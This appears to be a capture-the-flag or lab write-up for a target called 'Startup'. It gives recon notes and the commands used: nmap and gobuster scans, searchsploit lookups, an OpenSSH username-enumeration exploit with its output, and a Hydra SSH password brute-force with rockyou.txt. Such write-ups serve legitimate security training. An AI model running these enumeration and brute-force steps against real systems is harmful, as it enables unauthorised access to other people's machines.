Startup
#######
:Author: David Boyd
:Date: 2020-11-09

Reconnaissance
**************

User data:

+--------------+---------------+----------+----------------------+----------------+
| username     | email         | password | source               | etc            |
+==============+===============+==========+======================+================+
| Maya         |               |          | $TM/files/notice.txt |                |
+--------------+---------------+----------+----------------------+----------------+
| Kevin Hughes | kevin@iet.com |          | $TM/icons/blank.gif  | September 1995 |
+--------------+---------------+----------+----------------------+----------------+

Network data:

+------+---------+-----------+------------+------------+
| port | service | creds     | completion | info       |
+======+=========+===========+============+============+
| 21   | ftp     | anonymous | successful | notice.txt |
+------+---------+-----------+------------+------------+

- Apache/2.4.18 (Ubuntu) Server at $TM Port 80 | $TM/files/

Commands
********

Basic
=====

.. code-block:: Bash

	# Discovery
	sudo nmap -T5 -A -sS $TM
	sudo nmap --script=http-enum -sV -Pn $TM
	gobuster dir -u $TM -w /usr/share/wordlists/dirbuster/...small.txt

	# Determine if there are any vulnerabilities
	searchsploit vsftpd
		> nothing useful for verson 3.0.3
	searchsploit apache
		> nothing useful for version 2.4.18
	searchsploit openssh 7.2p2
		> linux/remote/40136	# Username enumeration

Username Enumeration - 40136.py
===============================

This is a Python2 script
	- dependencies: paramiko, numpy

.. code-block:: Bash

	# Install dependencies
	pip2 install paramiko numpy

	# run program
	python2 40136.py $TM -U \
	/usr/share/wordlists/SecLists/Usernames/Names/familynames-usa-top1000.txt
		> [+] WILSON
		> [+] HARRIS
		> [+] ALLEN
		> [+] ...
		...

Hydra - ssh
===========

.. code-block:: Bash

	hydra -L ssh-usernames.out -P /usr/share/wordlists/rockyou.txt \
	$TM ssh -t 4 -I

